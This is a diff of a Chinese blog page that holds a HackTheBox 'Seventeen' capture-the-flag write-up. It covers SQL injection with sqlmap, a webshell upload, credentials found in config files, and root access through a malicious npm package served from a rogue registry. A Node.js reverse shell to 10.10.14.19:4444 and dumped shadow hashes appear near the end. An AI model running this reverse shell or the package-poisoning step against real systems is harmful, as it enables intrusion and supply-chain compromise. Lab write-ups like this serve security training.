@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;473  10.10.11.165   端口扫描22,80,8000: 123456789101112131415161718192021$ nmap -sC -sV -Pn 10.10.11.165Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 202">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;473  10.10.11.165                                                                                                              端口扫描22,80,8000: 123">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Seventeen - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/09/19/Seventeen-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;473  10.10.11.165   端口扫描22,80,8000: 123456789101112131415161718192021$ nmap -sC -sV -Pn 10.10.11.165Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 202">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;473  10.10.11.165                                                                                                              端口扫描22,80,8000: 123">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022091801.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022091802.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022091803.jpg">
@@ -135,7 +135,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -225,7 +225,14 @@
 </li>
 <li><h2 id="10-10-11-165"><a href="#10-10-11-165" class="headerlink" title="10.10.11.165"></a>10.10.11.165</h2></li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091801.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091801.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,80,8000:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.165</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-18 23:15 CST</span><br><span class="line">Nmap scan report for 10.10.11.165</span><br><span class="line">Host is up (0.41s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 2eb26ebb927d5e6b3693171a8209e464 (RSA)</span><br><span class="line">|   256 1f57c653fc2d8b517d304202a4d65f44 (ECDSA)</span><br><span class="line">|_  256 d5a5363819fe0d677916e6da1791ebad (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Let's begin your education with us!</span><br><span class="line">8000/tcp open  http    Apache httpd 2.4.38</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">Service Info: Host: 172.17.0.4; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 133.21 seconds</span><br></pre></td></tr></table></figure>
 
@@ -234,14 +241,35 @@
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>一个教育相关的,可以得到对应域名：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl -s 10.10.11.165 | grep seventeen | html2text | head -n1</span></span><br><span class="line">seventeen.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091802.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091802.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="8000"><a href="#8000" class="headerlink" title="8000"></a>8000</h2><p>直接访问是403:</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091803.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091803.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>添加hosts后扫描子域名，发现exam：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.165 seventeen.htb</span><br><span class="line"></span><br><span class="line">gobuster vhost -u http://seventeen.htb -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="line"></span><br><span class="line">Found: exam.seventeen.htb (Status: 200) [Size: 17375]</span><br></pre></td></tr></table></figure>
 
 <h2 id="exam-seventeen-htb"><a href="#exam-seventeen-htb" class="headerlink" title="exam.seventeen.htb"></a>exam.seventeen.htb</h2><p>一个考试管理系统：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091804.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091804.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>exam系统搜索发现sql注入：</p>
 <ul>
 <li>Exam Reviewer Management System 1.0 - ‘id’ SQL Injection - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/50725" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/50725</a></li>
@@ -252,11 +280,39 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://exam.seventeen.htb/?p=take_exam&amp;id=1" --batch -D db_sfms --dump</span><br><span class="line"></span><br><span class="line">Database: db_sfms</span><br><span class="line">[3 tables]</span><br><span class="line">+---------+</span><br><span class="line">| user    |</span><br><span class="line">| storage |</span><br><span class="line">| student |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">Database: db_sfms</span><br><span class="line">Table: student</span><br><span class="line">[4 entries]</span><br><span class="line">+---------+----+--------+---------+----------+----------------------------------------------------+-----------+</span><br><span class="line">| stud_id | yr | gender | stud_no | lastname | password                                           | firstname |</span><br><span class="line">+---------+----+--------+---------+----------+----------------------------------------------------+-----------+</span><br><span class="line">| 1       | 1A | Male   | 12345   | Smith    | 1a40620f9a4ed6cb8d81a1d365559233                   | John      |</span><br><span class="line">| 2       | 2B | Male   | 23347   | Mille    | abb635c915b0cc296e071e8d76e9060c                   | James     |</span><br><span class="line">| 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024 (autodestruction) | Kelly     |</span><br><span class="line">| 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835                   | Jamie     |</span><br><span class="line">+---------+----+--------+---------+----------+----------------------------------------------------+-----------+</span><br><span class="line"></span><br><span class="line">Database: erms_db</span><br><span class="line">Table: users</span><br><span class="line">[3 entries]</span><br><span class="line">+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+</span><br><span class="line">| id | type | avatar                            | lastname | password                         | username         | firstname    | date_added          | last_login | date_updated        |</span><br><span class="line">+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+</span><br><span class="line">| 1  | 1    | ../oldmanagement/files/avatar.png | Admin    | fc8ec7b43523e186a27f46957818391c | admin            | Adminstrator | 2021-01-20 14:02:37 | NULL       | 2022-02-24 22:00:15 |</span><br><span class="line">| 6  | 2    | ../oldmanagement/files/avatar.png | Anthony  | 48bb86d036bb993dfdcf7fefdc60cc06 | UndetectableMark | Mark         | 2021-09-30 16:34:02 | NULL       | 2022-05-10 08:21:39 |</span><br><span class="line">| 7  | 2    | ../oldmanagement/files/avatar.png | Smith    | 184fe92824bea12486ae9a56050228ee | Stev1992         | Steven       | 2022-02-22 21:05:07 | NULL       | 2022-02-24 22:00:24 |</span><br><span class="line">+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+</span><br></pre></td></tr></table></figure>
 
 <h1 id="oldmanagement"><a href="#oldmanagement" class="headerlink" title="oldmanagement"></a>oldmanagement</h1><p>这个路径是8000端口的，使用得到的账号密码登录，发现文件上传功能：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091805.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091805.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>直接上传是在学生id目录下不解析，修改一下传到上层目录即可：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091806.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091807.jpg" alt=""></p>
-<h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091808.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091806.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091807.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091808.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="信息-1"><a href="#信息-1" class="headerlink" title="信息"></a>信息</h1><p>php文件中得到账号密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">www-data@5ec5dfc2216b:/var/www/html/employeemanagementsystem/process$ cat dbh.php</span><br><span class="line">&lt;/html/employeemanagementsystem/process$ cat dbh.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dBUsername = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbPassword = <span class="string">"2020bestyearofmylife"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dBName = <span class="string">"ems"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">conn = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$dBUsername</span>, <span class="variable">$dbPassword</span>, <span class="variable">$dBName</span>);</span></span><br><span class="line"></span><br><span class="line">if(!$conn)&#123;</span><br><span class="line">	echo "Databese Connection Failed";</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">www-data@5ec5dfc2216b:/var/www/html/employeemanagementsystem/process$ pwd</span><br><span class="line">pwd</span><br><span class="line">/var/www/html/employeemanagementsystem/process</span><br></pre></td></tr></table></figure>
 
@@ -264,7 +320,14 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@5ec5dfc2216b:/var/www$ cat /etc/passwd | grep sh$</span><br><span class="line">cat /etc/passwd | grep sh$</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">mark:x:1000:1000:,,,:/var/www/html:/bin/bash</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>mark用户密码就是数据库密码，ssh登录：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091809.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091809.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="kavi"><a href="#kavi" class="headerlink" title="kavi"></a>kavi</h1><p>再次检查，会发现kavi：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mark@seventeen:/var/www/html$ cat /etc/passwd | grep sh$</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">kavi:x:1000:1000:kavi:/home/kavi:/bin/bash</span><br><span class="line">mark:x:1001:1001:,,,:/home/mark:/bin/bash</span><br></pre></td></tr></table></figure>
 
@@ -280,13 +343,48 @@
 <h1 id="db-logger"><a href="#db-logger" class="headerlink" title="db-logger"></a>db-logger</h1><p>直接npm安装对应模块，查看内容，在其中发现一个密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">npm --registry http://127.0.0.1:4873 info db-logger</span><br><span class="line"></span><br><span class="line">npm --registry http://127.0.0.1:4873 install db-logger</span><br><span class="line"></span><br><span class="line">mark@seventeen:/tmp$ cd node_modules/db-logger/</span><br><span class="line">mark@seventeen:/tmp/node_modules/db-logger$ ls</span><br><span class="line">logger.js  package.json</span><br><span class="line">mark@seventeen:/tmp/node_modules/db-logger$ cat logger.js</span><br><span class="line">var mysql = require('mysql');</span><br><span class="line"></span><br><span class="line">var con = mysql.createConnection(&#123;</span><br><span class="line">  host: "localhost",</span><br><span class="line">  user: "root",</span><br><span class="line">  password: "IhateMathematics123#",</span><br><span class="line">  database: "logger"</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function log(msg) &#123;</span><br><span class="line">    con.connect(function(err) &#123;</span><br><span class="line">        if (err) throw err;</span><br><span class="line">        var date = Date();</span><br><span class="line">        var sql = `INSERT INTO logs (time, msg) VALUES ($&#123;date&#125;, $&#123;msg&#125;);`;</span><br><span class="line">        con.query(sql, function (err, result) &#123;</span><br><span class="line">        if (err) throw err;</span><br><span class="line">        console.log("[+] Logged");</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">module.exports.log = log</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091811.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091812.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091811.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091812.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="kavi-again"><a href="#kavi-again" class="headerlink" title="kavi again"></a>kavi again</h1><p>得到的密码就是kavi密码，ssh登录：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091813.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091813.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>根据上面的显示结果，查看对应文件内容，发现是安装两个模块后运行app，loglevel原本是没有安装的，运行后会安装，如果我们修改kavi用户的npmrc文件，即可控制安装来源，从而安装恶意模块，然后以root身份被执行：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091814.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091815.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091814.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091815.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><p>根据文档自己本地npm package server，托管恶意模块：</p>
 <ul>
 <li>verdaccio/verdaccio: 📦🔐 A lightweight Node.js private proxy registry<br><a href="https://github.com/verdaccio/verdaccio" target="_blank" rel="noopener">https://github.com/verdaccio/verdaccio</a></li>
@@ -294,8 +392,22 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动server</span></span><br><span class="line">npm install --global verdaccio</span><br><span class="line">verdaccio --listen 0.0.0.0:4873</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 制作package</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> server上原本package下载下来修改</span></span><br><span class="line">kavi@seventeen:/tmp/miao$ npm install loglevel</span><br><span class="line">kavi@seventeen:/tmp/miao/node_modules$ zip -r ./loglevel.zip loglevel/*</span><br><span class="line"></span><br><span class="line">nano lib/loglevel.js</span><br><span class="line"><span class="meta">#</span><span class="bash"> 在开头添加恶意代码</span></span><br><span class="line"></span><br><span class="line">npm adduser --registry http://localhost:4873</span><br><span class="line">npm login --registry http://localhost:4873</span><br><span class="line">npm unpublish --force --registry http://localhost:4873</span><br><span class="line">npm publish --registry http://localhost:4873</span><br></pre></td></tr></table></figure>
 
 <p>然后运行，恶意模块被安装，代码被执行，得到root：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091816.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091817.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091816.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022091817.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="evil-code"><a href="#evil-code" class="headerlink" title="evil code"></a>evil code</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">"net"</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">"child_process"</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">"/bin/bash"</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">4444</span>, <span class="string">"10.10.14.19"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>; <span class="comment">// Prevents the Node.js application from crashing</span></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
 
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$zKJAdLXN$2q2KQQs7CNXr6p.GJAuzESBeX97RB2cdQID4hUUv12CIZvEhCATo8JqsvzVghUlHGVfHXgAuWIVE.GtdVVZPw.:19092:0:99999:7:::</span><br><span class="line">kavi:$6$p67ISnef$mypsB6eaLk.iD7WzNHdnZBoKO1O1OgIE1E6pQ.7LidVs4O7TYNvnMkEMVFYXTrmxazGhMHf07HTwFyySxhY.V.:19092:0:99999:7:::</span><br><span class="line">mark:$6$wQBYfx4H$H65tyKF3GL&#x2F;61g4gr02xDnu5R4NerpbwhjO5ySUwx8Z701bfRLpXTli79hG67okVJQ6wlueO5NYWCVLONguxU1:19092:0:99999:7:::</span><br></pre></td></tr></table></figure>
